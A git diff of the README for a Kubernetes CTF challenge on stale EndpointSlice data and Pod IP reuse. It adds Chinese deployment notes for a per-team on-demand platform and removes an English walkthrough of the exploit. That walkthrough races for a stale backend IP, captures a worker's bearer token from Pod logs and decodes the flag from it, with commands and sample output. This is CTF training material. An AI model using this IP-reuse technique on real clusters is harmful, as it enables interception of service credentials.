@@ -1,223 +1,99 @@
 # Net Share
 
-Net Share is a Kubernetes CTF challenge about stale EndpointSlice data and Pod
-IP reuse. This directory is self-contained for an open/local Kubernetes
-environment.
+Net Share 是一道关于 EndpointSlice 数据陈旧与 Pod IP 复用的 Kubernetes CTF 题目。
+线上通过 **ret.sh** 平台按需下发:每支队伍由 ret.sh 拉起一个 bridge pod,经
+`nc` 与 KOND controller 交互,由 controller 为该队伍创建独立的 workload 集群、
+按 team id 生成专属 flag,并把 kubeconfig 进行返回
 
-## Files
 
-| File | Purpose |
+## 部署(ret.sh 按需环境)
+
+整体流程:
+
+```text
+选手点击「创建」
+  → ret.sh 拉起 bridge pod(注入 RET2SHELL_TEAM_ID + CONTROLLER_HOST + CONTROLLER_PORT)
+  → bridge pod 通过 nc 连接 controller,发送 team id
+  → controller 为该队伍创建独立 workload 集群,
+     用 team id 生成 sk-<uuid> flag 并注入 service assertion
+  → controller 回传 runtime-operator 的 kubeconfig
+  → bridge pod 在 :5000 网页上展示 kubeconfig
+  → 选手用该 kubeconfig 在自己的集群里完成利用
+停止实例 → bridge pod 退出 → nc 连接断开 → controller 自动销毁该集群
+```
+
+组件:
+
+| 路径 | 作用 |
 |---|---|
-| `challenge.yaml` | Challenge namespaces, victim service, stale EndpointSlice controller, policies, and platform worker. |
-| `user.yaml` | Low-privilege `runtime-operator` identity and RBAC. |
-| `exp.yaml` | Target Pod manifest for manual exploitation. |
-| `solve.sh` | Optional local solver reference. |
+| `kubernetes-on-demand-main/` | KOND controller:`docker compose` 启动,`nc` 监听 :8888;每条连接创建一套 CAPI workload 集群,并自动把 `challenge.yaml` / `user.yaml` 应用进去。 |
+| `ctf-challenge/challenge.yaml` | 题目主体:命名空间、受害服务 `profile-query`、陈旧 EndpointSlice 控制器、各类策略与平台 worker。 |
+| `ctf-challenge/user.yaml` | 选手低权身份 `runtime-operator` 及其 RBAC。 |
+| `ret2shell-ext-controller-pod/` | ret.sh 实例 bridge pod:`app.py`(nc 桥)、`pod.yaml`(实例清单)、`checker.rx`(flag 校验)。 |
 
-## Deploy
+### 部署步骤
 
-Apply the challenge resources:
-
-```bash
-kubectl apply -f challenge.yaml
-kubectl apply -f user.yaml
-```
-
-Wait for the workloads:
+1. 启动 controller:
 
 ```bash
-kubectl get pods -n customer-platform -o wide
-kubectl get pods -n platform-operations -o wide
+cd kubernetes-on-demand-main
+PUBLIC_HOST=<选手可达的 controller 主机 IP> \
+FLAG_SALT=<与平台一致的盐> FLAG_CHAL_ID=<与平台一致的题目 id> \
+docker compose up -d
 ```
 
-Expected Pods:
+controller 会监听 `nc` :8888,并为每条连接创建一套 workload 集群。
 
-```text
-NAME                                    READY   STATUS    RESTARTS   AGE   IP
-customer-profile-api-7b6b9897c8-g4lq8   1/1     Running   0          38s   10.244.1.34
-```
+2. 对齐 flag 参数(controller 与 ret.sh `checker.rx` 必须一致,否则提交不通过):
 
-```text
-NAME                                           READY   STATUS    RESTARTS   AGE
-endpoint-catalog-reconciler-7d46f975d8-k5r4p   1/1     Running   0          38s
-profile-cache-refresh-67c577c789-l9t4d         1/1     Running   0          38s
-```
+   - controller `FLAG_SALT`  == `checker.rx` 的 `ENCRYPT_KEY`
+   - controller `FLAG_CHAL_ID` == `checker.rx` 的 `HASH_KEY`
 
-`challenge.yaml` contains the placeholder assertion
-`svc.v1.pending.pending`. In a real game environment the platform should patch
-`platform-operations/profile-client-credentials` with a per-team assertion that
-contains the flag in `service_proof`.
-
-## Scenario
-
-The workload is split across three namespaces:
-
-| Namespace | Purpose |
-|---|---|
-| `tenant-runtime` | Writable workspace for creating target Pods and reading their logs. |
-| `customer-platform` | Victim namespace containing `customer-profile-api`, selectorless Service `profile-query`, and EndpointSlice `profile-query-registry`. |
-| `platform-operations` | Platform worker namespace containing `profile-cache-refresh` and `endpoint-catalog-reconciler`. |
-
-`profile-cache-refresh` sends a request roughly every 10 seconds:
-
-```text
-Authorization: Bearer svc.v1.<base64url-json-payload>.<hmac-sha256-signature>
-```
-
-The flag is inside the decoded payload's `service_proof` field.
-
-## Vulnerability
-
-`profile-query` is a selectorless Service. Its backend is manually maintained in
-the EndpointSlice `profile-query-registry`. When
-`endpoint-catalog-reconciler` recycles the backend Pod, it leaves the
-EndpointSlice pointing at the old Pod IP for a 28-second stale window.
-
-During that window:
-
-```text
-profile-cache-refresh -> profile-query (ClusterIP) -> kube-proxy DNAT -> old Pod IP:8080
-```
-
-If the target Pod obtains the old IP before the EndpointSlice is updated,
-kube-proxy forwards the platform request to the target Pod.
-
-## Exploit
-
-### Step 1 - Watch for the stale window
-
-Open two terminals:
+3. 构建并推送 bridge pod 镜像:
 
 ```bash
-kubectl get pods -n customer-platform -o wide -w
+cd ret2shell-ext-controller-pod
+docker build -t <registry>/netshare-bridge:latest
+docker push <registry>/netshare-bridge:latest
 ```
 
-Then get:
+4. 在 ret.sh 上配置题目:
 
-```text
-NAME                                    READY   STATUS        RESTARTS   AGE   IP            NODE
-customer-profile-api-7b6b9897c8-g4lq8   1/1     Running       0          39s   10.244.1.34   worker-0
-customer-profile-api-7b6b9897c8-g4lq8   1/1     Terminating   0          40s   10.244.1.34   worker-0
-customer-profile-api-7b6b9897c8-k2p9m   1/1     Running       0          2s    10.244.1.37   worker-0
-...
-```
+   - `ret2shell-ext-controller-pod/checker.rx`:将 `CONTROLLER_HOST` / `CONTROLLER_PORT`
+     指向第 1 步的 controller;`ENCRYPT_KEY` / `HASH_KEY` 按第 2 步对齐;按平台约定
+     处理 `sk-` 前缀的解析(flag 形如 `sk-<uuid>`,不带花括号)
+   - `ret2shell-ext-controller-pod/pod.yaml`:把 `image` 改成第 3 步的镜像
+   - 将 `checker.rx` 设为该题的 flag checker,`pod.yaml` 设为实例清单
+
+
+### 环境要求
+
+workload 集群由 controller 按模板(`kubernetes-on-demand-main/resources/`)自动创建,
+已具备以下使漏洞成立的特性:
+
+- Kubernetes v1.28(由 CAPI 创建,默认启用 `ValidatingAdmissionPolicy`)。
+- Calico CNI,`blockSize: 28` 的小分配块,使旧后端 IP 能被目标 Pod 重新占用。
+- 节点预置 `python:3.11-alpine` 镜像(目标 Pod 使用 `imagePullPolicy: Never`)
+
+### 本地快速验证(不经 ret.sh)
+
+可直接用一条 `nc` 模拟 bridge pod 的行为:
 
 ```bash
-kubectl get endpointslices -n customer-platform -w
+printf '62\n' | nc <controller 主机> 8888   # 保持连接打开
 ```
 
-With the output:
+输出中 `-----BEGIN KUBECONFIG-----` 与 `-----END KUBECONFIG-----` 之间即为 kubeconfig;
+保存后即可 `kubectl --kubeconfig <文件> get ns`, 关闭该连接会销毁对应集群
 
-```text
-NAME                     ADDRESSTYPE   PORTS   ENDPOINTS     AGE
-profile-query-registry   IPv4          8080    10.244.1.34   5m42s
-profile-query-registry   IPv4          8080    10.244.1.34   6m10s
-profile-query-registry   IPv4          8080    10.244.1.37   6m38s
-...
-```
+### 验证可用权限
 
-The stale window exists when the EndpointSlice still advertises the old IP, but
-the Running backend Pod has moved to another IP or is temporarily absent.
-
-### Step 2 - Acquire the stale backend IP
-
-Compare the EndpointSlice IP and the Running backend Pod IP:
+拿到 kubeconfig 后:
 
 ```bash
-ADV=$(kubectl get endpointslices -n customer-platform \
-  -l kubernetes.io/service-name=profile-query \
-  -o jsonpath='{.items[0].endpoints[0].addresses[0]}')
-
-POD=$(kubectl get pods -n customer-platform \
-  -l app.kubernetes.io/name=customer-profile-api \
-  --field-selector status.phase=Running \
-  -o jsonpath='{.items[0].status.podIP}')
-
-echo "advertised=$ADV running=${POD:-<none>}"
+export KUBECONFIG="$PWD/runtime-operator.kubeconfig"
+kubectl get pods -n tenant-runtime
+kubectl get pods,svc,endpoints,endpointslices -n customer-platform -o wide
 ```
 
-Apply the target Pod:
 
-```bash
-kubectl apply -f exp.yaml
-```
-
-Check its IP:
-
-```bash
-kubectl get pod connectivity-probe-1 -n tenant-runtime -o jsonpath='{.status.podIP}'; echo
-```
-
-If the Pod IP does not match `$ADV`, delete it and retry while the stale window
-is still open:
-
-```bash
-kubectl delete pod connectivity-probe-1 -n tenant-runtime --grace-period=0 --force
-```
-
-### Step 3 - Capture the raw header
-
-When the target Pod has the stale backend IP, follow its logs:
-
-```bash
-kubectl logs -f connectivity-probe-1 -n tenant-runtime
-```
-
-Captured raw header:
-
-```text
-[*] connectivity probe ready on :8080
-=== raw request headers ===
-GET /v1/cache/refresh/profile-snapshot
-Host: profile-query.customer-platform.svc.cluster.local
-User-Agent: curl/8.5.0
-Accept: */*
-Authorization: Bearer svc.v1.eyJhdWQiOiJjdXN0b21lci1wcm9maWxlLWFwaSIsImV4cCI6MTcxMDA4NjQwMCwiaWF0IjoxNzEwMDAwMDAwLCJpc3MiOiJwcm9maWxlLWNhY2hlLXJlZnJlc2giLCJzY29wZSI6InByb2ZpbGUucmVhZCIsInNlcnZpY2VfcHJvb2YiOiJzay00NWRhNjUyOS1lYzRlLWI4ODAtN2Y1Zi0yZDRmYTMxYjNjOTYiLCJ0ZW5hbnQiOiJ0ZW5hbnQtcnVudGltZSJ9.example-signature
-X-Request-ID: 4ef42264-7d9d-44f5-8af0-8ef2b96f7747
-X-Tenant-ID: tenant-runtime
-X-Service-Route: profile-cache-refresh
-```
-
-### Step 4 - Decode the Base64URL payload
-
-The assertion format is:
-
-```text
-svc.v1.<base64url-json-payload>.<signature>
-```
-
-Decode the third field:
-
-```bash
-TOKEN='svc.v1.eyJhdWQiOiJjdXN0b21lci1wcm9maWxlLWFwaSIsImV4cCI6MTcxMDA4NjQwMCwiaWF0IjoxNzEwMDAwMDAwLCJpc3MiOiJwcm9maWxlLWNhY2hlLXJlZnJlc2giLCJzY29wZSI6InByb2ZpbGUucmVhZCIsInNlcnZpY2VfcHJvb2YiOiJzay00NWRhNjUyOS1lYzRlLWI4ODAtN2Y1Zi0yZDRmYTMxYjNjOTYiLCJ0ZW5hbnQiOiJ0ZW5hbnQtcnVudGltZSJ9.example-signature'
-
-python3 - "$TOKEN" <<'PY'
-import base64
-import json
-import sys
-
-token = sys.argv[1].removeprefix("Bearer ").strip()
-parts = token.split(".")
-payload = parts[2] + "=" * (-len(parts[2]) % 4)
-data = json.loads(base64.urlsafe_b64decode(payload))
-print(json.dumps(data, indent=2, sort_keys=True))
-print("flag =", data["service_proof"])
-PY
-```
-
-Decoded output:
-
-```json
-{
-  "aud": "customer-profile-api",
-  "exp": 1710086400,
-  "iat": 1710000000,
-  "iss": "profile-cache-refresh",
-  "scope": "profile.read",
-  "service_proof": "sk-45da6529-ec4e-b880-7f5f-2d4fa31b3c96",
-  "tenant": "tenant-runtime"
-}
-```
-
-```text
-flag = sk-45da6529-ec4e-b880-7f5f-2d4fa31b3c96
-```
